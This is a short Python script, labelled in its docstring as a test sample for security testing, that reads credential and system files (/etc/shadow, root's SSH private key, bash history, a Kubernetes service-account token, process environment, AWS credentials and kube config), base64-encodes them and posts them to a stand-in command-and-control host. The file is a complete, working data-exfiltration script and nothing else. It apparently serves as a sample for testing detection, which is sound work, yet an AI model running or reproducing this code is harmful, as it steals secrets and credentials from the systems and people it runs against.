#!/usr/bin/env python3
"""[TEST SAMPLE] Data Exfiltration Script - FOR SECURITY TESTING ONLY"""
import os
import base64
import json
import urllib.request

EXFIL_SERVER = "http://evil-c2-server.com:8443/collect"

def collect_sensitive_data():
    """Collect sensitive files commonly targeted by attackers"""
    targets = [
        "/etc/passwd",
        "/etc/shadow",
        "/root/.ssh/id_rsa",
        "/root/.bash_history",
        "/var/run/secrets/kubernetes.io/serviceaccount/token",
        "/proc/self/environ",
        os.path.expanduser("~/.aws/credentials"),
        os.path.expanduser("~/.kube/config"),
    ]
    stolen = {}
    for path in targets:
        try:
            with open(path, 'r') as f:
                stolen[path] = f.read()
        except Exception:
            pass
    return stolen

def exfiltrate(data):
    payload = base64.b64encode(json.dumps(data).encode()).decode()
    req = urllib.request.Request(
        EXFIL_SERVER,
        data=payload.encode(),
        headers={"Content-Type": "application/octet-stream"}
    )
    urllib.request.urlopen(req)

if __name__ == "__main__":
    data = collect_sensitive_data()
    exfiltrate(data)
